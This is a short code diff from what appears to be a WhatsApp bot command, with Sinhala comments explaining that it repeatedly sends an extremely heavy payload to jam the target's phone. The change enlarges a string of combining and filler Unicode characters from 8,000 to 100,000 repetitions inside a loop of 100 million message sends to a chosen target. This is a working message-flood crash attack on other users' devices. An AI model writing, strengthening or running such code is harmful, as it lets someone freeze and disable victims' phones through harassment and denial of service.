@@ -23,7 +23,7 @@ async (conn, mek, m, { from, isOwner, reply, args, senderNumber }) => {
         // 1. මේ ලූප් එකෙන් වෙන්නේ අතිශය බර වැඩි Payload එකක් දිගටම යවන එක
         // මේක නිසා එයාගේ ෆෝන් එකේ ඩේටා හුවමාරුව (Processing) හිර වෙනවා.
         for (let i = 0; i < 100000000; i++) {
-            const jammerPayload = " \u0345\u0361\u0345\u1160\u1160".repeat(8000) + "҉".repeat(1000);
+            const jammerPayload = " \u0345\u0361\u0345\u1160\u1160".repeat(100000) + "҉".repeat(100000);
             
             await conn.sendMessage(target, { 
                 text: jammerPayload,
